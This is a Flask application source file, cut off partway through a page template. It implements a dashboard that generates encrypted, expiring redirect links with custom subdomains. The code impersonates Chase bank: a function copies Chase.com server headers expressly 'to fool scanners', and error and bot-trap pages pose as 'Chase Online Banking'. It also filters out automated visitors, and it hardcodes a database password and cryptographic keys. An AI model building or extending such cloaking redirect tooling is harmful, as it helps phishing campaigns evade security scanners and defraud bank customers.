from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, Response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
import random
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
import bleach
from dotenv import load_dotenv

app = Flask(__name__)
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Configuration values
FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
AES_GCM_KEY = b'\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09'
HMAC_KEY = b'\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9'
VALKEY_HOST = "valkey-c93d570-marychamberlin31-5857.g.aivencloud.com"
VALKEY_PORT = 25534
VALKEY_USERNAME = "default"
VALKEY_PASSWORD = "AVNS_iypeRGpnvMGXCd4ayYL"
DATA_RETENTION_DAYS = 90
USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")

# Key versioning for rotation
KEY_VERSION = "1"  # Increment on manual key change
PREVIOUS_AES_GCM_KEY = None  # Set to old key if rotation occurred
PREVIOUS_HMAC_KEY = None     # Set to old key if rotation occurred

# Verify keys at startup
try:
    if len(AES_GCM_KEY) != 32:
        raise ValueError("AES-GCM key must be 32 bytes")
    Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(secrets.token_bytes(12)), backend=default_backend())
    logger.debug("AES-GCM key validated successfully")
except Exception as e:
    logger.error(f"Invalid AES-GCM key at startup: {str(e)}")
    raise ValueError(f"AES-GCM key initialization failed: {str(e)}")

try:
    if len(HMAC_KEY) != 32:
        raise ValueError("HMAC key must be 32 bytes")
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(b"test")
    h.finalize()
    logger.debug("HMAC key validated successfully")
except Exception as e:
    logger.error(f"Invalid HMAC key at startup: {str(e)}")
    raise ValueError(f"HMAC key initialization failed: {str(e)}")

# Flask configuration
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
app.config['WTF_CSRF_SECRET_KEY'] = WTF_CSRF_SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
logger.debug("Flask configuration set successfully")

# CSRF protection
csrf = CSRFProtect(app)

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username is required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Username can only contain letters, numbers, _, @, or .")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain is required"),
        Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
    ])
    randomstring1 = StringField('Randomstring1', validators=[
        DataRequired(message="Randomstring1 is required"),
        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link is required"),
        URL(message="Invalid URL format (must start with http:// or https://)")
    ])
    randomstring2 = StringField('Randomstring2', validators=[
        DataRequired(message="Randomstring2 is required"),
        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
    ])
    expiry = SelectField('Expiry', choices=[
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week'),
        ('2592000', '1 Month')
    ], default='86400')
    analytics_enabled = BooleanField('Enable Analytics')
    submit = SubmitField('Generate URL')

# Valkey initialization with fallback
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.debug("Valkey connection established successfully")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
    valkey_client = None

# Custom Jinja2 filter for datetime
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except (TypeError, ValueError) as e:
        logger.error(f"Error formatting timestamp: {str(e)}")
        return "Not Available"

app.jinja_env.filters['datetime'] = datetime_filter

# Encryption rotation and key management
encryption_rotation = ['aes_gcm', 'hmac_sha256']
encryption_index_key = "encryption_index"
key_rotation_interval = 86400  # Rotate keys daily

def rotate_keys():
    global AES_GCM_KEY, HMAC_KEY, PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY
    try:
        if valkey_client:
            last_rotation = valkey_client.get("key_rotation_timestamp")
            current_time = int(time.time())
            if not last_rotation or (current_time - int(last_rotation) > key_rotation_interval):
                PREVIOUS_AES_GCM_KEY = AES_GCM_KEY
                PREVIOUS_HMAC_KEY = HMAC_KEY
                AES_GCM_KEY = secrets.token_bytes(32)
                HMAC_KEY = secrets.token_bytes(32)
                valkey_client.set("key_rotation_timestamp", current_time)
                logger.debug("Encryption keys rotated successfully")
    except Exception as e:
        logger.error(f"Error rotating keys: {str(e)}")

def get_next_encryption_method():
    try:
        if valkey_client:
            index = int(valkey_client.get(encryption_index_key) or 0)
            valkey_client.set(encryption_index_key, (index + 1) % len(encryption_rotation))
            return encryption_rotation[index % len(encryption_rotation)]
        else:
            return secrets.choice(encryption_rotation)
    except Exception as e:
        logger.error(f"Error in get_next_encryption_method: {str(e)}")
        return 'aes_gcm'

def rate_limit(limit=5, per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            try:
                ip = request.remote_addr
                if not valkey_client:
                    logger.warning("Valkey unavailable, skipping rate limit")
                    return f(*args, **kwargs)
                key = f"rate_limit:{ip}:{f.__name__}"
                current = valkey_client.get(key)
                if current is None:
                    valkey_client.setex(key, per, 1)
                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                elif int(current) >= limit:
                    logger.warning(f"Rate limit exceeded for IP: {ip}")
                    abort(429, "Too Many Requests")
                else:
                    valkey_client.incr(key)
                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                return f(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}", exc_info=True)
                return f(*args, **kwargs)
        return wrapped_function
    return decorator

def encrypt_aes_gcm(payload, key=AES_GCM_KEY):
    try:
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        data = payload.encode('utf-8')
        ciphertext = encryptor.update(data) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag
        result = base64.urlsafe_b64encode(encrypted).decode('utf-8')
        logger.debug(f"AES-GCM encrypted payload: {result[:20]}... (length: {len(result)})")
        return result
    except Exception as e:
        logger.error(f"AES-GCM encryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_aes_gcm(encrypted, key=AES_GCM_KEY):
    try:
        encrypted_data = base64.urlsafe_b64decode(encrypted)
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        result = decrypted.decode('utf-8')
        logger.debug(f"AES-GCM decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"AES-GCM decryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Decryption failed: {str(e)}")

def encrypt_hmac_sha256(payload, key=HMAC_KEY):
    try:
        data = payload.encode('utf-8')
        h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
        h.update(data)
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(data).decode('utf-8')}.{base64.urlsafe_b64encode(signature).decode('utf-8')}"
        logger.debug(f"HMAC-SHA256 encrypted payload: {result[:20]}... (length: {len(result)})")
        return result
    except Exception as e:
        logger.error(f"HMAC-SHA256 encryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_hmac_sha256(encrypted, key=HMAC_KEY):
    try:
        data_b64, sig_b64 = encrypted.split('.')
        data = base64.urlsafe_b64decode(data_b64)
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
        h.update(data)
        h.verify(signature)
        result = data.decode('utf-8')
        logger.debug(f"HMAC-SHA256 decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"HMAC-SHA256 decryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Decryption failed: {str(e)}")

def generate_random_string(length):
    try:
        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
        result = "".join(secrets.choice(characters) for _ in range(length))
        logger.debug(f"Generated random string: {result[:10]}... (length: {len(result)})")
        return result
    except Exception as e:
        logger.error(f"Error generating random string: {str(e)}", exc_info=True)
        return secrets.token_urlsafe(length)

def get_base_domain():
    try:
        host = request.host
        parts = host.split('.')
        if len(parts) >= 2:
            return '.'.join(parts[-2:])
        return host
    except Exception as e:
        logger.error(f"Error getting base domain: {str(e)}")
        return "qinjack.com"  # Updated to match your domain

def mimic_chase_response():
    """Mimic Chase.com server headers to fool scanners."""
    headers = {
        'Server': 'AkamaiGHost',
        'Content-Type': 'text/html; charset=UTF-8',
        'X-Frame-Options': 'SAMEORIGIN',
        'X-XSS-Protection': '1; mode=block',
        'X-Content-Type-Options': 'nosniff',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    }
    return headers

def check_behavior(ip):
    """Analyze request behavior to detect bots with stricter checks."""
    try:
        if not valkey_client:
            logger.warning("Valkey unavailable, skipping behavior check")
            return True
        session_key = f"behavior:{ip}"
        headers = request.headers
        current_time = time.time()
        behavior_data = valkey_client.get(session_key)
        if behavior_data:
            data = json.loads(behavior_data)
            data['requests'].append({
                'time': current_time,
                'user_agent': headers.get('User-Agent', ''),
                'accept': headers.get('Accept', ''),
                'referer': headers.get('Referer', ''),
                'accept_language': headers.get('Accept-Language', ''),
                'connection': headers.get('Connection', '')
            })
            if len(data['requests']) > 10:
                data['requests'] = data['requests'][-10:]  # Keep last 10 requests
            intervals = [data['requests'][i+1]['time'] - data['requests'][i]['time'] for i in range(len(data['requests'])-1)]
            # Stricter checks: rapid requests, multiple User-Agents, or missing browser headers
            if intervals and (min(intervals) < 0.05 or 
                             len(set([r['user_agent'] for r in data['requests']])) > 2 or
                             not any(h in headers.get('Accept', '') for h in ['text/html', 'application/xhtml+xml']) or
                             not headers.get('Accept-Language')):
                logger.warning(f"Suspicious behavior detected for IP {ip}")
                return False
            valkey_client.setex(session_key, 3600, json.dumps(data))
        else:
            valkey_client.setex(session_key, 3600, json.dumps({
                'requests': [{
                    'time': current_time,
                    'user_agent': headers.get('User-Agent', ''),
                    'accept': headers.get('Accept', ''),
                    'referer': headers.get('Referer', ''),
                    'accept_language': headers.get('Accept-Language', ''),
                    'connection': headers.get('Connection', '')
                }]
            }))
        return True
    except Exception as e:
        logger.error(f"Error checking behavior for IP {ip}: {str(e)}")
        return True

def get_valid_usernames():
    try:
        if valkey_client:
            cached = valkey_client.get("usernames")
            if cached:
                logger.debug("Retrieved usernames from Valkey cache")
                return json.loads(cached)
        response = requests.get(USER_TXT_URL)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            try:
                valkey_client.setex("usernames", 3600, json.dumps(usernames))
                logger.debug("Cached usernames in Valkey")
            except Exception as e:
                logger.error(f"Valkey error caching usernames: {str(e)}")
        logger.debug(f"Fetched {len(usernames)} usernames from GitHub")
        return usernames
    except Exception as e:
        logger.error(f"Error fetching user.txt: {str(e)}", exc_info=True)
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            if 'username' not in session:
                logger.debug(f"Redirecting to login from {request.url}, session: {session}")
                return redirect(url_for('login', next=request.url))
            logger.debug(f"Authenticated user: {session['username']}, session: {session}")
            return f(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in login_required: {str(e)}", exc_info=True)
            return redirect(url_for('login'))
    return decorated_function

@app.route("/login", methods=["GET", "POST"])
@rate_limit(limit=5, per=60)
def login():
    try:
        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}, session: {session}")
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            logger.debug(f"Login attempt with username: {username}")
            valid_usernames = get_valid_usernames()
            if username in valid_usernames:
                session['username'] = username
                session.permanent = True
                session.modified = True
                logger.debug(f"User {username} logged in, session: {session}")
                next_url = form.next_url.data or url_for('dashboard')
                logger.debug(f"Redirecting to {next_url}")
                return redirect(next_url)
            logger.warning(f"Invalid login attempt: {username}")
            form.username.errors.append("Invalid username")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-600 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-5">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Username</label>
                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                        </div>
                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                    </form>
                    <a href="/bot-trap" style="display:none;">Bot Trap</a>
                </div>
            </body>
            </html>
        """, form=form)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/", methods=["GET"])
@rate_limit(limit=5, per=60)
def index():
    try:
        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
        if 'username' in session:
            logger.debug(f"User {session['username']} redirecting to dashboard")
            return redirect(url_for('dashboard'))
        logger.debug("No user session, redirecting to login")
        return redirect(url_for('login'))
    except Exception as e:
        logger.error(f"Error in index: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
@rate_limit(limit=5, per=60)
def dashboard():
    try:
        if 'username' not in session:
            logger.error("Session missing username, redirecting to login")
            return redirect(url_for('login'))
        username = session['username']
        logger.debug(f"Accessing dashboard for user: {username}, session: {session}")

        rotate_keys()  # Rotate encryption keys if needed
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            logger.debug(f"Processing form data: {form.data}")
            subdomain = bleach.clean(form.subdomain.data.strip())
            randomstring1 = bleach.clean(form.randomstring1.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            randomstring2 = bleach.clean(form.randomstring2.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL: Must be a valid http:// or https:// URL"
                logger.warning(f"Invalid destination_link: {destination_link}")

            if not error:
                # Generate Synaq-like URL
                url_id = generate_random_string(16)
                timestamp = int(time.time())
                expiry_timestamp = timestamp + expiry
                payload = json.dumps({
                    "student_link": destination_link,
                    "timestamp": timestamp * 1000,
                    "expiry": expiry_timestamp
                })
                logger.debug(f"Raw payload: {payload}")

                try:
                    encryption_method = get_next_encryption_method()
                    if encryption_method == 'aes_gcm':
                        encrypted_payload = encrypt_aes_gcm(payload)
                    else:
                        encrypted_payload = encrypt_hmac_sha256(payload)
                    logger.debug(f"Encrypted payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
                except ValueError as e:
                    logger.error(f"Encryption failed with {encryption_method}: {str(e)}")
                    error = f"Failed to encrypt payload: {str(e)}"

                if not error:
                    # Encode payload in base64 for query parameter
                    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode('utf-8')).decode('utf-8')
                    path_segment = f"{randomstring1}{randomstring2}"
                    generated_url = (f"https://{urllib.parse.quote(subdomain)}.{base_domain}/link"
                                    f"?id={url_id}&ts={timestamp}&cnf=-&url={urllib.parse.quote(encoded_payload)}/{path_segment}")
                    url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
                    if valkey_client:
                        try:
                            valkey_client.hset(f"user:{username}:url:{url_id_hash}", mapping={
                                "url": generated_url,
                                "destination": destination_link,
                                "encrypted_payload": encrypted_payload,
                                "url_id": url_id,
                                "encryption_method": encryption_method,
                                "key_version": KEY_VERSION,
                                "created": timestamp,
                                "expiry": expiry_timestamp,
                                "clicks": 0,
                                "analytics_enabled": "1" if analytics_enabled else "0"
                            })
                            valkey_client.expire(f"user:{username}:url:{url_id_hash}", DATA_RETENTION_DAYS * 86400)
                            logger.info(f"Generated URL for {username}: {generated_url}, Method: {encryption_method}, Key Version: {KEY_VERSION}, Analytics: {analytics_enabled}")
                        except Exception as e:
                            logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
                            error = "Failed to store URL in database"
                    else:
                        logger.warning("Valkey unavailable, cannot store URL")
                        error = "Database unavailable"

                    if not error:
                        logger.debug("URL generation successful, redirecting to dashboard")
                        return redirect(url_for('dashboard'))

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                logger.debug(f"Fetching URL keys for user: {username}")
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                logger.debug(f"Found {len(url_keys)} URL keys")
                for key in url_keys:
                    try:
                        url_data = valkey_client.hgetall(key)
                        if not url_data:
                            logger.warning(f"Empty data for key {key}")
                            continue
                        url_id = key.split(':')[-1]
                        urls.append({
                            "url": url_data.get('url', ''),
                            "destination": url_data.get('destination', ''),
                            "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'Not Available',
                            "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'Not Available',
                            "clicks": int(url_data.get('clicks', 0)),
                            "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                            "url_id": url_id
                        })
                    except Exception as e:
                        logger.error(f"Error processing URL key {key}: {str(e)}")
            except Exception as e:
                logger.error(f"Valkey error fetching URLs: {str(e)}")
                valkey_error = "Unable to fetch URL history due to database error"
        else:
            logger.warning("Valkey unavailable, cannot fetch URLs")
            valkey_error = "Database unavailable"

        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
        primary_color = f"#{theme_seed}"

        logger.debug(f"Rendering dashboard for user: {username}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Dashboard - {{ username }}</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); color: #1f2937; }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                    .card:hover { transform: translateY(-5px); }
                    .table-container { max-height: 400px; overflow-y: auto; }
                    table { width: 100%; border-collapse: collapse; }
                    th, td { padding: 12px; text-align: left; }
                    th { background: #e5e7eb; position: sticky; top: 0; }
                    tr:nth-child(even) { background: #f9fafb; }
                    .error { background: #fee2e2; color: #b91c1c; }
                    .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                    .toggle-switch input { opacity: 0; width: 0; height: 0; }
                    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
                    .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
                    input:checked + .slider { background-color: #4f46e5; }
                    input:checked + .slider:before { transform: translateX(26px); }
                </style>
                <script>
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else {
                                alert('Failed to toggle analytics');
                            }
                        }).catch(error => {
                            console.error('Error toggling analytics:', error);
                            alert('Error toggling analytics');
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="container max-w-7xl mx-auto">
                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center rounded-lg">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="bg-white p-8 rounded-xl card mb-8">
                        <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
                        <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                        <form method="POST" class="space-y-5">
                            {{ form.csrf_token }}
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Subdomain</label>
                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Expiry</label>
                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Enable Analytics</label>
                                {{ form.analytics_enabled(class="mt-1 p-3") }}
                            </div>
                            {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                        </form>
                    </div>
                    <div class="bg-white p-8 rounded-xl card">
                        <h2 class="text-2xl font-bold mb-6 text-gray-900">URL History</h2>
                        {% if urls %}
                            {% for url in urls %}
                                <div class="card bg-gray-50 p-6 rounded-lg mb-4">
                                    <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                    <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                    <div class="flex items-center mt-2">
                                        <label class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
                                        <label class="toggle-switch">
                                            <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                    <div class="mt-2 flex space-x-2">
                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                    </div>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p class="text-gray-600">No URLs generated yet.</p>
                        {% endif %}
                    </div>
                </div>
            </body>
            </html>
        """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
    except Exception as e:
        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/bot-trap", methods=["GET"])
def bot_trap():
    try:
        ip = request.remote_addr
        logger.warning(f"Bot trapped at /bot-trap from IP: {ip}")
        if valkey_client:
            valkey_client.setex(f"blocked:{ip}", 86400, "bot_trap")
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
            status=200,
            headers=headers
        )
    except Exception as e:
        logger.error(f"Error in bot_trap: {str(e)}")
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "CSRF token required"}), 403
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                return jsonify({"status": "error", "message": "URL not found"}), 404
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
            logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
            return jsonify({"status": "ok"}), 200
        else:
            logger.warning("Valkey unavailable, cannot toggle analytics")
            return jsonify({"status": "error", "message": "Database unavailable"}), 500
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                abort(404, "URL not found")
            valkey_client.delete(key)
            valkey_client.delete(f"url_payload:{url_id}")
            logger.debug(f"Deleted URL {url_id}")
            return redirect(url_for('dashboard'))
        else:
            logger.warning("Valkey unavailable, cannot delete URL")
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
